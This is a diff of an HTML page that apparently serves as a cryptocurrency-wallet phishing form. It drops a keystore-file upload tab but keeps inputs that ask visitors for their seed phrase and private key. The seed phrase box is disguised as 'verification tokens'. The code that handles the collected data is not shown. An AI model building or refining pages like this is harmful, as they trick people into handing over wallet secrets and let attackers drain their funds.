@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -839,7 +839,6 @@
 
 
                 <div class="type-toggle">
-                    <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
                     <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
                     <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
                 </div>
@@ -849,20 +848,6 @@
                     <textarea class="w-textarea phrase-area" id="phraseInput"
                         placeholder="Enter your verification tokens, separated by spaces..." spellcheck="false"
                         autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
-                </div>
-
-
-                <div class="input-pane" id="pane-keystore">
-                    <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
-                        spellcheck="false" autocomplete="off"></textarea>
-                    <input type="" class="w-input" id="keystorePassword" placeholder="Password" autocomplete="off" />
-                    <button class="attach-btn" onclick="document.getElementById('keystoreFileInput').click()">
-                        <i class="ri-attachment-2"></i>
-                        Attach Keystore File
-                    </button>
-                    <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg"
-                        onchange="processAttachment(this)" />
-                    <p class="attach-file-name" id="attachFileName"></p>
                 </div>
 
 
